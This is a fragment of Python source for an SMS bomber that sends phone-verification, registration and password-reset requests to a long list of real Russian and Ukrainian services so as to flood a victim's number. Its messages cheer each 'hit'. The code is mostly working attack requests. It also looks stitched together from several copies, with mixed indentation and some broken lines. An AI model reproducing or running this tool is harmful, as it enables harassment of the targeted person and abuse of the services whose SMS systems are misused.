            print(' [-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print(' [+] OK sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print(' [+] qlean sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print(' [+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print(' [+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print(' [+] Tinder sent!')
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(' [+] Twitch sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print(' [+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print(' [+] wowworks sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print(' [+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print(' [+] Alpari sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print(' [+] SMS sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print(' [+] Delivery sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

         try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')
	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print(Fore.GREEN + 'Вы успешно нанесли удар!!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		print(Fore.GREEN + 'Вы успешно нанесли удар!!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')
	try:
		requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn',json={"msisdn":_phone,"password":passmegafon})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonemas,"email":"","city":""})
    except:
        pass
    try:
        requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone[1:], maska="8(###)###-##-##")
        requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonemas, "code":""})
    except:
        pass
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone})
    except:
        pass
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""})
    except:
        pass
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
        requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"})
    except:
        pass
    try:
        # под сомнением
        phonemas=mask(str=phone, maska="#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonemas})

        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"})
    except:
        pass
    try:
        requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
    except:
        pass
    try:
        requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="8(###)###-##-##")
        requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone})
    except:
        pass
    try:
        requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
    except:
        pass
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
    except:
        pass
    try:
        phonemas=mask(phone, maska="+# (###) ### - ## - ##")
        requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
    except:
        pass
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="(+#)##########")
        requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonemas, "type": 1}})
    except:
        pass
    try:
        requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
    except:
        pass
    try:
        requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
    except:
        pass
    try:
        requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
    except:
        pass
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8(###)###-##-##")
        requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.post("http://sushigourmet.ru/auth",data={"phone": phonemas, "stage": 1})
    except:
        pass
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
    except:
        pass
    try:
        requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
    except:
        pass
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
    except:
        pass
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonemas})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
    except:
        pass
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
    except:
        pass
    try:
        requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
    except:
        pass
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
    except:
        pass
    try:
        requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
    except:
        pass
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
    except:
        pass
    try:
        requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonemas, "alien": "0"})
    except:
        pass
    try:
        requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
    except:
        pass
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
    except:
        pass
    try:
        requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
    except:
        pass
    try:
        requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonemas}})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonemas})
    except:
        pass
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
    except:
        pass
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://paylate.ru/registry",data={"mobile": phonemas,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
    except:
        pass
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonemas})
    except:
        pass
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
    except:
        pass
    try:
        requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
    except:
        pass
    try:
        requests.post(
            "https://www.ollis.ru/gql",
            json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonemas,"call_time": "1","pravila2": "on"})
    except:
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
    except:
        pass
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"})
    except:
        pass
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://auth.multiplex.ua/login", json={"login": phone})
    except:
        pass
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
    except:
        pass
    try:
        requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
    except:
        pass
    try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
    except:
        pass
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
    except:
        pass
    try:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
    except:
        pass
    try:
        requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
    except:
        pass
    try:
        requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ### ## ##")
        requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonemas)
    except:
        pass
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
    except:
        pass
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
    except:
        pass
    try:
